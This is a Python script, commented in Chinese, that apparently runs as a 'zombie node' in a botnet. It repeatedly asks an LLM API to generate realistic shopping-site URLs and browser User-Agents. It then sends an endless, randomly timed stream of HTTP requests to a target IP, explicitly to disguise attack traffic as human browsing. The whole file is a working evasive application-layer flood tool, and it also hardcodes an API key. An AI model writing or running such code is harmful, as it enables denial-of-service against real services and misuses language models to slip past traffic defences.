import urllib.request
import time
import random
import sys
import json
from openai import OpenAI

# ==========================================
# 核心升级：接入真实的 LLM API
# ==========================================
# 这里以 DeepSeek 为例（API极其便宜且效果极好），你可以换成任何支持 OpenAI 格式的 API
API_KEY = "sk-e544843fbc9e4689a6843ac3edf5c410" # ⚠️ 请填入你的真实 API KEY
BASE_URL = "https://api.deepseek.com/v1"     # 如果用 OpenAI，则删掉这行或改为 openai 官网
MODEL_NAME = "deepseek-chat"                 # 或 "gpt-3.5-turbo"

client = OpenAI(api_key=API_KEY, base_url=BASE_URL)
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"

print("[*] 僵尸节点待命，等待骨干网路由物理收敛...")
time.sleep(5)

def get_real_llm_payload():
    """让大模型实时生成极高微观熵的伪装流量特征"""
    prompt = """你是一个真实的人类网民。请随机生成一个在大型综合电商网站上的浏览行为。
    请只返回JSON格式，必须包含两个字段：
    1. 'uri': 一个极其逼真的URL路径（包含复杂的搜索参数、筛选条件、甚至乱码的追踪ID）。
    2. 'user_agent': 一个常见但不重复的真实浏览器User-Agent。"""
    
    try:
        response = client.chat.completions.create(
            model=MODEL_NAME,
            messages=[{"role": "user", "content": prompt}],
            response_format={"type": "json_object"},
            timeout=5.0 # 防止 API 卡死导致发包中断
        )
        data = json.loads(response.choices[0].message.content)
        return data.get('uri', '/'), data.get('user_agent', 'Mozilla/5.0')
    except Exception as e:
        # API 熔断时的后备伪装方案
        return f"/search?q=fallback_{random.randint(1000,9999)}", "Mozilla/5.0"

print(f"[*] 路由收敛完毕，LLM 代理已上线，开始向 {TARGET_IP} 发起智能化降维打击...")

while True:
    # 1. 呼叫大模型大脑，实时生成攻击载荷
    uri, ua = get_real_llm_payload()
    if not uri.startswith('/'): uri = '/' + uri
    url = f"http://{TARGET_IP}{uri}"
    
    # 2. 构建并发送 HTTP 请求
    req = urllib.request.Request(url, headers={'User-Agent': ua})
    try:
        urllib.request.urlopen(req, timeout=2)
        print(f"    [LLM 生成] 发送高熵包 -> {uri[:40]}...")
    except Exception:
        pass
    
    # 3. LLM 拟人休眠 (1 到 4 秒)
    time.sleep(random.uniform(1.0, 4.0))
